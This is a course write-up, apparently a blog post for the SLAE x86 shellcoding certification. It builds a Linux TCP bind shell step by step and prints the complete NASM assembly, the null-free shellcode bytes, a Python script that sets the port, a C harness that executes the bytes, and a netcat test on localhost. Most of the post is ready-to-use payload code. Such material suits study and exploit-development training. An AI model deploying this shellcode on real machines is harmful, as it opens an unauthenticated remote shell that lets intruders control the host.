# SLAE x86 - Project 1

# Tasks

Create a Shell_Bind_TCP shellcode

- Binds to a port  
- Execs Shell on incoming connection 
- Port number should be easily configurable

# Create a Shell_Bind_TCP shellcode 

The first task is to create shellcode that binds to a TCP port and executes a shell when connected to. I will be using `execve()` in my example code.

My assembly code is documented throughout, however, I will step through each piece in this blog post.

## Bind Shell Overview

The general outline of C code is below and more details can be read [here](https://anubissec.github.io/Creating-a-TCP-Bind-Shell/#):
```c
// Create socket  
host_sockid = socket(PF_INET, SOCK_STREAM, 0);  

// Initialize sockaddr struct to bind socket using it  
hostaddr.sin_family = AF_INET;  
hostaddr.sin_port = htons(1337);  
hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);  

// Bind socket to IP/Port in sockaddr struct  
bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));  
    
// Listen for incoming connections  
listen(host_sockid, 2);  

// Accept incoming connection, don't store data, just use the sockfd created  
client_sockid = accept(host_sockid, NULL, NULL);  

// Duplicate file descriptors for STDIN, STDOUT and STDERR  
dup2(client_sockid, 0);  
dup2(client_sockid, 1);  
dup2(client_sockid, 2);  

// Execute /bin/sh  
execve("/bin/sh", NULL, NULL);  
close(host_sockid);  
    
return 0;
```

Since this is not a C assignment, I will assume the reader understands the code above. In essense, we must create a socket with `socket()`, bind it to a port with `bind()`, make it listen with `listen()` and `accept()`, redirect input/output to STDIN, STDOUT, and STDERR using `dup2()`, and execute `/bin/sh` using `execve()` to create our reverse shell.


## Bind Shell Shellcode

The first thing I do is zero out the registers that I plan to be using.

I zero out ebx, then use that in a `mul` statement to zero out the `eax` and `edx` registers; details on the mul instruction can be found [here](https://www.aldeid.com/wiki/X86-assembly/Instructions/mul).

While I didn't need to zero out edx, I used the `mul` trick here because I found it a neat, polymorphic way to zero out the eax register which I may use in the future. 

```assembly
; Create socket
xor ebx, ebx       
mul ebx             ; zero out eax, and edx
xor ecx, ecx
```

Next, I must call `socketcall()` as it is essentially a middleware function to execute the socket related functions. 

To execute `socketcall()`, I will execute a `syscall()` with the proper registers and stack values. 

A [socketcall()](https://man7.org/linux/man-pages/man2/socketcall.2.html) function call is just a specific [syscall()](https://man7.org/linux/man-pages/man2/syscall.2.html) and it's function definition looks like this:
```c
int syscall(SYS_socketcall, int call, unsigned long *args);
```

The first parameter (SYS_socketcall) is a refereence to the socketcall() enumerator index which can be found by running this command in the terminal:

```bash
cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socketcall
```

This results in the ID of 102, or hex `0x66` and will be placed into register `eax`, based on the x86 calling convention.

The second parameter is the argument to define the `socketcall()` function to use. In this case, it will be `0x1` for `SYS_SOCKET` (a.k.a. `socket()`) which can be found by running:

```bash
cat /usr/include/linux/net.h | grep SYS_SOCKET
```

Keeping in mind the x86 Calling Convention, I will load the socketcall() function enumerator index `0x66` into `eax` (`al` to remove nulls) and socket() function enumerator index `0x1` into `ebx` (`bl` to remove nulls). 

The assembly looks like this:
```assembly
mov al, 0x66  		; socketcall()	
mov bl, 0x1			; SYS_SOCKET : socket()	
```

Next I must push the parameters of the [socket()](https://man7.org/linux/man-pages/man2/socket.2.html) call onto the stack in reverse order. 

The socket() function prototype looks like this
```c
int socket(int domain, int type, int protocol);
```

The (protocol) parameter IPPROTO_TCP which is `0x6`, found with this command:
```bash
cat /usr/include/netinet/in.h | grep IPPROTO_TCP
```

The (type) parameter will be SOCK_STREAM which is `0x1`, found with this command:
```bash
cat /usr/include/i386-linux-gnu/bits/socket_type.h  | grep SOCK_STREAM
```

The (domain) parameter will be AF_INET which is `0x2`, found with this command:
```bash
cat /usr/src/linux-headers-5.15.0-kali3-common/include/linux/socket.h | grep AF_INET
```

The assembly looks like this:

```assembly
                    ; *args: push in reverse order to stack
push 0x6			; protocol = IPPROTO_TCP (6) - 
push 0x1			; type = SOCK_STREAM (1)
push 0x2			; domain = AF_INET (2)
mov ecx, esp        ; capture address of stack in ecx
```

The parameters will be popped off the stack and the


All that's left to do to call `socketcall()` by issuing the syscall() command `int 0x80`, after which the return value (in `eax`) will be a pointer to the newly created socket, which I move into `edi` for later use.

```assembly
int 0x80
mov edi, eax 		; store socket ptr to edi in edx
```

Next I must call [bind()](https://man7.org/linux/man-pages/man2/bind.2.html).

To do this, I again need to call socketcall() but with a new value for SYS_socketcall. In this instance, I will use the value of `0x02` which is the enumerator index of bind(). This can be found by running the following command:

```bash
cat /usr/include/linux/net.h | grep SYS_BIND
```

To do this, I first clear registers I plan to use and setup the syscall with the following assembly:

```assembly
; clear registers
xor eax, eax
xor ebx, ebx
xor ecx, ecx

mov al, 0x66  		; int socketcall(int call, unsigned long *args)	;
mov bl, 0x2			; bind()	;
```

Now I setup the stack with the arguments for the bind() call which has this function definition:

```c
int bind(int sockfd, const struct sockaddr *addr,
            socklen_t addrlen);
```

To be more presise, the stack will be used to house the structure of data for the `sockaddr` struct which accepts a `sockaddr_in` struct. The [sockaddr_in](https://www.gta.ufrj.br/ensino/eel878/sockets/sockaddr_inman.html) struct looks like this:
```c
struct sockaddr_in {
    short            sin_family;   // e.g. AF_INET
    unsigned short   sin_port;     // e.g. htons(3490)
    struct in_addr   sin_addr;     // see struct in_addr, below
    char             sin_zero[8];  // zero this if you want to
};
```

The first argument that is pushed is the `in_addr` of `0x0` to denote INADDR_ANY. This enum value can be found here:
```bash
cat /usr/src/linux-headers-5.10.0-kali7-common/include/uapi/linux/in.h | grep ANY
```

Next I push the port number of `1337` which is `0x539` in hex.

Then, the value of AF_INET (2) is pushed to the stack, similar to the accept() call above.

Finally, I move the pointer to the top of the stack into ecx to be used later as a parameter in the bind() function call.

The assembly for these steps can be seen here:

```assembly
                    ; setup stack for [sockaddr *addr] structure
push ecx			; push 0x0: INADDR_ANY 
push word 0x3905	; port 1337 = 0x539  = rev.. 0x3905
push word 0x2		; sa_family_t = AF_INET
mov ecx, esp		; move pointer to structure into ecx 
```

Next I will push the rest of the bind() arguments to the stack.

First by pushing `0x10` for the address length. 

Next I push the pointer to the socaddr data structure we manually created by pushing `ecx`.

Then, I push `edi` which is a pointer to the socket we created in the socket() call above.

Finally, I move the stack pointer into `ecx` and execute the syscall. 

The assembly for these steps:

```assembly
                    ; bind() - push args to stack
push 0x10			; addrlen
push ecx			; ptr socaddr *addr (on stack)
push edi			; ptr to socket from above

mov ecx, esp
int 0x80
```

At this point I have created a socket using `socket()` and bound to port `1337`. Next I must have this port listen for incoming connections.

To do this I again clear the registers `eax`, `ebx`, and `ecx` by xoring them with themselves. This step may or may not be required depending on how the registers are affected by each syscall(), however, I am doing the for safety in this proof of concept and for learning purposes. 

The `listen()` function will be called again through a `socketcall()`. The enum index for this is `0x4` and can be found by running this command in the terminal:

```bash
cat /usr/include/linux/net.h | grep SYS_LISTEN
```

Next I must push the arguments for the [listen()](https://man7.org/linux/man-pages/man2/listen.2.html) function onto the stack. It's function definition looks like this:
```c
int listen(int sockfd, int backlog);
```

Again, the arguments are pushed in reverse order. The `backlog` parameter will be set to `0x0` and the sockfd (socket file descriptor) is a pointer to the previously created socket which I currently have stored in the `edi` register. Once these values are pushed to the stack, the stack pointer is stored in `ecx` to be used as an argument in the syscall()/socketcall() and a syscall() is triggered.

The assembly for this is below:
```assembly
; listen
mov al, 0x66  		; int socketcall(int call, unsigned long *args)	;
mov bl, 0x4			; int listen(int sockfd, int backlog)	;

push 0x0			; backlog (0)
push edi 			; socket ptr

mov ecx, esp
int 0x80
```

Now that the socket has a defined backlog property by use of the listen() function, I must execute accept() to accept incoming connections. 

Once again I clear out the registers I plan to use:
```assembly
xor eax, eax
xor ebx, ebx
xor ecx, ecx
```

The [accept()](https://man7.org/linux/man-pages/man2/accept.2.html) function definition looks like this:
```c
int accept(int sockfd, struct sockaddr *restrict addr,
                socklen_t *restrict addrlen);

```

For the accept() function, we can place NULL values for both the second and third parameters as we do not need to capture any data about the host creating the incoming connection. 

Thus, after zeroing out the registers, `ecx` is now `0x0` which is a NULL value and can be pushed to the stack twice. Then, the sockfd parameter can be pushed, which is again a pointer to our socket address stored in `edi`. 

Once these values are on the stack we can move the pointer to the stack into `ecx` and execute the syscall.

```assembly
; accept
mov al, 0x66  		; int socketcall(int call, unsigned long *args)	;
mov bl, 0x5			; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)	;

push ecx
push ecx
push edi 			; socket ptr

mov ecx, esp
int 0x80
```

Now that a socket has been created and is accepting incoming connections, we can redirect input/output back to the socket using dup2().

The [dup2()](https://man7.org/linux/man-pages/man2/dup.2.html) function definition looks like this:
```c
int dup2(int oldfd, int newfd, int flags);
```

Keep in mind that file descriptors on linux are: 
- stdin = 0
- stdout = 1
- stderr = 2

Thus, we will need to execute dup2() three times, one for each file descriptor. 

An important note is that the previous call to `accept()` has returned a pointer to a file descriptor for the socket in the `eax` register. We will want to use this file descriptor as a parameter in the dup2() function calls. 

To call dup2(), we will execute another syscall(). The enumerator index of `63`|`0x3f` can be found by running this command:
```bash
cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2
```

Now that we have the syscall() number for dup2() and the general concept of what we will be doing, I will post the assembly now and explain it to give a clearer picture as there is a lot to unpack.

```assembly
	; REDIRECT I/O
	; file descriptor : fd = (stdin = 0, stdout = 1, stderr = 2)
	; Will loop through all 3 file descriptors and redirct output to socket

						 
	xchg ebx, eax		; mov file descriptor for the accepted socket to ebx

	xor ecx, ecx		; zero out ecx
	mov cl, 0x2 		; set the counter (for loop)
	
loop:					; Loop through all file descriptors
	mov al, 0x3f		; syscall: dup2 (63)  -- NOTE: eax was cleared above. Good to reduce # of instructions.
	int 0x80			; exec dup2
	dec ecx				; decrement counter
	jns loop			; jump until SF is set ; (jmp if positive)
```

This code `xchg ebx, eax` puts the `eax` register (the socket file descriptor) into `ebx` which will be used as the first argument to the bind() function. 

Then `ecx` is cleared and set to 0x2 using `cl, 0x2` to set up the loop. Now, an important note here is that `ecx` is also used as the second argument in the syscall(). So, as we loop through `ecx` is used as both the loop counter AND the syscall() argument. 

During the loop, we `mov al, 0x3f` to setup the syscall() to execute `dup2()`. This must be done in the loop as executing the syscall() within each loop will overwrite it with the return value.

Then the syscall() is executed, ecx is decremented, and a jump condition is checked until the Sign Flag (SF) flag is set, which means the result of a previous expression was negative (in this case, decrementing ecx resulted in a -1).

So now that the file descriptors have been redirected, all that is left to do is execute /bin/sh. To do this, I will set up the stack and exectue `execve()` with the string "/bin//sh". Note that this string is 8 bytes long. It must be in increments of 4 as the push assembly instruction will push 4 bytes to the stack at a time, anything less and it will pad with 0x0 which will break the shellcode. Luckilly, execve() will normalize the path and "/bin/sh" will be executed.

To do this, the enum index execve (`11`/`0xb`) can be found using:
```bash
cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve
```

The function definition for [execve()](https://man7.org/linux/man-pages/man2/execve.2.html) is:

```c
int execve(const char *pathname, char *const argv[],
            char *const envp[]);
```

Once we load eax with the value of 0xb for the syscall, then set `edx` to 0x0 by xoring it with itself. This will be used to set null a null terminator for the string as well as be used as the third parameter to execve() once the syscall() is executed. I push a string to the stack by first pushing a null to terminate the string and then push 4 bytes at a time, making sure to reverse the order of the string as it will be poped off the stack. Note that characters are pushed onto the stack in little endian format which is specific to the x86 linux operating system architecture. 

Once the string is pushed to the stack, I move the stack pointer into `ebx` and a null value into `ecx` to be used as the first tand second arguments of execve() respectfully.

The assembly is:
```assembly
mov al, 0xb			; syscall: execve (11) int execve(const char *pathname, char *const argv[], char *const envp[]);

xor edx, edx		; envp (NULL)
push edx			; push 0x00 null terminator for string
push 0x68732f2f		; "hs//"   LITTLE ENDIAN
push 0x6e69622f 	; "nib/"


mov ebx, esp		; pathname: point ebx to stack
mov ecx, edx		; NULL

int 0x80			; execute execve
```

That's all. A socket has been created, bound to port 1337, opened for incoming connections, and file descriptors have been re-routed to push stdin/stdout/stderr through the socket, and /bin/sh has been called upon connection.


The full assembly looks like this:

```assembly
	; Filename: bind_shell.nasm

global _start

	; | EAX | system call numer ( + return data ) |
	; | EBX | 1st |
	; | ECX | 2nd |
	; | EDX | 3rd |
	; | ESI | 4th |
	; | EDI | 5th |
	; | EBP | 6th |

section .text
_start:

	; Create socket
	xor ebx, ebx
	mul ebx             ; zero out eax, and edx
	xor ecx, ecx

	mov al, 0x66  		; syscall: int socketcall(int call, unsigned long *args)	
	mov bl, 0x1			; int socket(int domain, int type, int protocol)  : SYS_SOCKET (0x01)	

						; *args: push in reverse order to stack
	push 0x6			; protocol = IPPROTO_TCP (6) - 
	push 0x1			; type = SOCK_STREAM (1)
	push 0x2			; domain = AF_INET (2)
	mov ecx, esp

	int 0x80
	mov edi, eax 		; store socket ptr to edi in edx

	; bind socket
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov al, 0x66  		; int socketcall(int call, unsigned long *args)	;
	mov bl, 0x2			; bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)	;


						; source: man 7 ip
						; struct sockaddr_in {
						;     sa_family_t    sin_family	; /* address family: AF_INET */
						;     in_port_t      sin_port	;   /* port in network byte order */
						;     struct in_addr sin_addr	;   /* internet address */
						; }	;

						; /* Internet address. */
						; struct in_addr {
						;     uint32_t       s_addr	;     /* address in network byte order */
						; }	;

					
						; setup stack for [sockaddr *addr] structure
	push ecx			; INADDRY_ANY
	push word 0x3905	; port 1337 = 0x539  = rev.. 0x3905
	push word 0x2		; sa_family_t = AF_INET
	mov ecx, esp		; move pointer to structure into ecx 

						; bind() - push args to stack
	push 0x10			; addrlen
	push ecx			; ptr socaddr *addr (on stack)
	push edi			; ptr to socket from above

	mov ecx, esp
	int 0x80		


	; listen
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov al, 0x66  		; int socketcall(int call, unsigned long *args)	;
	mov bl, 0x4			; int listen(int sockfd, int backlog)	;

	push ecx			; backlog (0)
	push edi 			; socket ptr

	mov ecx, esp
	int 0x80



	; accept
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov al, 0x66  		; int socketcall(int call, unsigned long *args)	;
	mov bl, 0x5			; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)	;

	push ecx
	push ecx
	push edi 			; socket ptr

	mov ecx, esp
	int 0x80


	; REDIRECT I/O
	; file descriptor : fd = (stdin = 0, stdout = 1, stderr = 2)
	; Will loop through all 3 file descriptors and redirct output to socket

						 
	xchg ebx, eax		; mov file descriptor for the accepted socket to ebx

	xor ecx, ecx		; zero out ecx
	mov cl, 0x2 		; set the counter (for loop)
	
loop:					; Loop through all file descriptors
	mov al, 0x3f		; syscall: dup2 (63)  -- NOTE: eax was cleared above. Good to reduce # of instructions.
	int 0x80			; exec dup2
	dec ecx				; decrement counter
	jns loop			; jump until SF is set ; (jmp if positive)


	; Execute /bin/sh
	mov al, 0xb			; syscall: execve (11) int execve(const char *pathname, char *const argv[], char *const envp[]);

	xor edx, edx		; envp (NULL)
	push edx			; push 0x00 null terminator for string
	push 0x68732f2f		; "hs//"   LITTLE ENDIAN
	push 0x6e69622f 	; "nib/"


	mov ebx, esp		; pathname: point ebx to stack
	mov ecx, edx		; NULL

	int 0x80			; execute execve
```

## Making the port dynamic

To accomplish the second part of this assignment, I must make the port dynamic. In order to do this, I will write a python script that wraps the shellcode and inserts the port number from an argument in the python script.

To do this, I will first get the shellcode of the compiled and linked assembly binary, then replace the hex values representing the port.

To compile and link the assmebly, I run this command on the bind.nasm assembly file:

```bash
nasm -F dwarf -g -F dwarf -f elf32 -o bind.o bind.nasm
ld -m elf_i386 -z execstack -N -o bind bind.o  
```

This should result in a binary called `bind`. To get the shellcode, I execute:
```bash
objdump -d "bind" |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

This outputs shellcode and we can find the place where our port is located as the hex value we pushed to the stack was `\x05\x39`. Now we must find/replace this value with our new port. An important note is that our hex value must be in big endian (network byte order) as opposed to our local linux architecture of little endian, so I will have to reverse the byte order when getting the hex value of our port number.

The Python script that takes in a port number, converts it to the proper byte order format, and outputs shellcode is as follows:

```python
#/bin/python3

import sys
import socket
import struct

shellcode1 = "\\x31\\xdb\\xf7\\xe3\\x31\\xc9\\xb0\\x66\\xb3\\x01\\x6a\\x06\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x66\\xb3\\x02\\x51\\x66\\x68"
# shellcode_port += "\\x05\\x39"
shellcode2 = "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x66\\xb3\\x04\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x66\\xb3\\x05\\x51\\x51\\x57\\x89\\xe1\\xcd\\x80\\x93\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xcd\\x80"

if not len(sys.argv) == 2:
    print(f"Usage: python3 {sys.argv[0]} <port>")
    sys.exit()

port = sys.argv[1]

# convert to network byte order and hex
# port = hex(socket.htons(int(port)))[2:].zfill(4)
port = struct.pack("!i", int(port)).hex()
port_byte1 = port[len(port)-4:len(port)-2]
port_byte2 = port[len(port)-2:]
print(f"port: \\x{port_byte1}\\x{port_byte2}")
shellcode = shellcode1 + f"\\x{port_byte1}\\x{port_byte2}" + shellcode2
print(shellcode)
```

And execute it with:
```bash
python3 create_x86_bind_shell.py 1234
```

The output of the script is shellcode that can be entered into this template.c program:

```c
#include <sys/mman.h>
#include <stdio.h>

unsigned char code[] = "\x31\xdb\xf7\xe3\x31\xc9\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x02\x51\x66\x68\x04\xd2\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x04\x51\x57\x89\xe1\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x05\x51\x51\x57\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xcd\x80";

int main(){
  printf("Shellcode length: %d\n", strlen(code));
  int r =  mprotect((void *)((int)code & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
  printf("mprotect: %d\n",r);
  int (*ret)() = (int(*)())code;
  return ret();
}
```

Once the shellcode is entered, just compile it for x86 using this command:

```bash
gcc -fno-stack-protector -z execstack template.c -m32 -o bind_shell
```

And execute the resulting binary:
```bash
./bind_shell
```

Then, from another terminal, validate the connection by connecting with netcat and running some commands like `ls` `whoami` `id`, etc.:
```
nc localhost 1234
```


# Certification Requirements

This blog post has been created for completing the requirements of the SecurityTube/PentesterAcademy [x86 Assembly Language and Shellcoding on Linux (SLAE)](https://www.pentesteracademy.com/course?id=3) certification:

Student ID: SLAE-alecjmaly
